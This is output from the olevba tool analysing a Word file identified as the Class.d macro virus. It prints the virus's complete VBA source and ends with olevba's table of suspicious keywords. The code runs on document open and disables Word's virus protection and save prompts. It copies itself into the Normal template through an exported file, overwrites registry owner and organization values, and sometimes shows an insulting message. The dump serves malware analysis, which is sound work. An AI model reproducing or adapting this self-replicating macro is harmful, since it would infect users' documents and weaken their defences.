olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f253d8f7de57f33b985e4320ef08f84bde864a35
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f253d8f7de57f33b985e4320ef08f84bde864a35 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Const REG_SZ As Long = 1
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Sub AutoOpen()
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
On Error GoTo out
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Options.VirusProtection = False
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Options.SaveNormalPrompt = False
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Options.ConfirmConversions = False
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If nt > 70 And ad > 0 Then GoTo out
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If nt < 70 Then
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End If
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
With host.codemodule
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    For x = 1 To 16
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    .deletelines 1
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    Next x
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End With
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If nt < 70 Then
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    With host.codemodule
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    .replaceline 1, "Sub AutoClose()"
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    .replaceline 91, "Sub ToolsMacro()"
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    For x = 70 To 81
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
        .deletelines 62
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    Next x
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    .replaceline 35, "    For x = 1 To 4"
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    End With
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End If
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If nt < 70 Then
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
u = RegCloseKey(k)
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End If
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
With host.codemodule
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    For x = 2 To 104 Step 2
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
    Next x
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End With
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
out:
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End Sub
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
Sub ViewVBCode()
'Johnna M. Blackhair11/4/99 11:47:40 AMHP LaserJet IIISi on LPT1:Raffle.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

